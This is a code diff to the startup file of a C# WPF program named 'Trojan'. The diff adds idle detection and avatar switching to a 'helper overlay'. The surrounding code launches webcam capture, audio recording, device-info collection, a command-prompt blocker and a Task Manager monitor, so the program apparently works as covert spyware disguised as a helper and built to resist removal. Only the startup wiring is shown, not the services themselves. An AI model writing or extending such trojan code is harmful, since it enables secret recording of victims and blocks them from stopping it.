@@ -1,12 +1,13 @@
 ﻿using System.Windows;
-// using Trojan.DataBase;
-using Trojan.Views;
-using Trojan.Services;
 using System.Windows.Input;
 using Trojan.Data.DataBase;
 using Trojan.Data.Seeders;
-using Trojan.UI.Views.Pages;
 using Trojan.Services;
+using Trojan.Services;
+using Trojan.UI.ViewModels;
+using Trojan.UI.Views.Pages;
+// using Trojan.DataBase;
+using Trojan.Views;
 
 namespace Trojan
 {
@@ -20,16 +21,46 @@ namespace Trojan
         private AudioRecorderService _audioRecorder;
         private CmdBlockerService _cmdBlockerService;
         private TaskManagerMonitorService _taskManagerMonitorService;
-        
+        private IdleService _idleService;
         public static bool _devMode { get; private set; }
-        
+        private HelperOverlayViewModel? _overlayViewModel;
         protected override async void OnStartup(StartupEventArgs e)
         {
             base.OnStartup(e);
+
+            _idleService = new IdleService();
+
+
+            _idleService.SleepRequested += () =>
+            {
+                Current.Dispatcher.Invoke(() =>
+                {
+                    _overlayViewModel?.SetSleepingAvatar();
+                });
+            };
+
+            _idleService.WakeRequested += () =>
+            {
+                Current.Dispatcher.Invoke(() =>
+                {
+                    _overlayViewModel?.SetAwakeAvatar();
+                });
+            };
+
             EventManager.RegisterClassHandler(
-            typeof(Window),
-            Keyboard.KeyDownEvent,
-            new KeyEventHandler(GlobalKeyHandler));
+                typeof(Window),
+                UIElement.MouseMoveEvent,
+                new MouseEventHandler(GlobalMouseMoveHandler));
+
+            EventManager.RegisterClassHandler(
+                typeof(Window),
+                UIElement.MouseDownEvent,
+                new MouseButtonEventHandler(GlobalMouseDownHandler));
+
+            EventManager.RegisterClassHandler(
+                typeof(Window),
+                Keyboard.KeyDownEvent,
+                new KeyEventHandler(GlobalKeyHandler));
 
             await DeviceScannerService.SaveDeviceInfo();
             
@@ -48,6 +79,7 @@ namespace Trojan
             var mainWindow = new HelperOverlayWindow();
             MainWindow = mainWindow;
             mainWindow.Show();
+
             _webcamService = new WebcamService();
             _webcamService.Start();
 
@@ -62,6 +94,8 @@ namespace Trojan
             _taskManagerMonitorService.Start();
 
             var helperOverlayWindow = new HelperOverlayWindow();
+            _overlayViewModel =
+            helperOverlayWindow.DataContext as HelperOverlayViewModel;
             MainWindow = helperOverlayWindow;
             helperOverlayWindow.Show();
 
@@ -75,6 +109,16 @@ namespace Trojan
             _cmdBlockerService?.Stop();
             _taskManagerMonitorService?.Stop();
             base.OnExit(e);
+        }
+
+        private void GlobalMouseDownHandler(object sender, MouseButtonEventArgs e)
+        {
+            _idleService.RegisterActivity();
+        }
+
+        private void GlobalMouseMoveHandler(object sender, MouseEventArgs e)
+        {
+            _idleService.RegisterActivity();
         }
         private void GlobalKeyHandler(object sender, KeyEventArgs e)
         {
